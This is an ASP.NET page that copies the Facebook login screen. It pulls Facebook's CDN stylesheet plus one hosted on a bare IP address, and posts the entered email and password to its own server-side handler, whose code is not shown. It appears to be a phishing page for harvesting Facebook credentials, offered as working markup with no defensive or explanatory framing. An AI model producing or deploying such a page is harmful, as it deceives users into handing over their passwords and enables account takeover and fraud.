<%@ Page Title="Home Page" Language="C#" AutoEventWireup="true"
    CodeFile="Default.aspx.cs" Inherits="_Default" %>
    <!DOCTYPE html>
<html lang="en" id="facebook" class="no_js">

<head>

    <link type="text/css" rel="stylesheet" href="http://static.ak.fbcdn.net/rsrc.php/v1/yS/r/-bJoQWafM4K.css" />
    <link href="http://78.90.209.205/facebook/Styles/Site.css" rel="stylesheet" type="text/css" />
</head>
<body>
<div style="width: 400px;margin:17px auto;">
<div style="margin-left:400px">
    <form method="POST" id="form1" runat="server">
    <input type="hidden" autocomplete="off" id="locale" name="locale" value="en_US" />
    <table cellspacing="0"><tr><td class="html7magic">

    </td><td class="html7magic"></td></tr><tr><td><asp:TextBox name="email" ID="txtEmail" runat="server" value="" tabindex="1" />

    </td><td><asp:TextBox  class="inputtext" name="pass" ID="txtPass" runat="server" tabindex="2" /></td><td><label class="uiButton uiButtonConfirm" for="ua1ysz_5"><asp:Button ID="Button1" Text="Log in" runat="server"  type="submit" OnClick="btnProcessForm_Click" />

    </label><td class="login_form_label_field">

    <a href="#" rel="nofollow">Forgot your password?</a></td></tr>
    <input type="hidden" autocomplete="off" id="lsd" name="lsd" value="rRw_n" />
    </form>
    </div>
</div>
</body></html>